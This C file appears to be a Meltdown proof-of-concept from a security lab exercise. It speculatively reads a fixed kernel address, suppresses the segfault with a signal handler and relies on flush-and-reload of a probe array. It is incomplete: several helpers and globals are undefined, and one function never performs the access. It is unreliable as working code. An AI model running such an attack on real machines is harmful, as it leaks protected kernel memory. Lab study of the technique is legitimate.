#include <stdlib.h>
#include <stdio.h>

void meltdown(unsigned long kernel_data_addr)
{
    char kernel_data = 0;
    // The following statement will cause an exception
    kernel_data = *(char *)kernel_data_addr;
    array[7 * 4096 + DELTA] += 1;
}
// Signal handler
static sigjmp_buf jbuf;
static void catch_segv() { siglongjmp(jbuf, 1); }

void meltdown_asm(unsigned long kernel_data_addr)
{
    char kernel_data = 0;
    // Give eax register something to do
    asm volatile(
        ".rept 400;"
        "add $0x141, %%eax;"
        ".endr;"
        :
        :
        : "eax");
}

int main()
{
    // Register a signal handler
    signal(SIGSEGV, catch_segv);
    // FLUSH the probing array
    flushSideChannel();
    if (sigsetjmp(jbuf, 1) == 0)
    {
        // change this address here
        meltdown(0xfb61b000);
    }
    else
    {
        printf("Memory access violation!\n");
    }
    // RELOAD the probing array
    reloadSideChannel();
    return 0;
}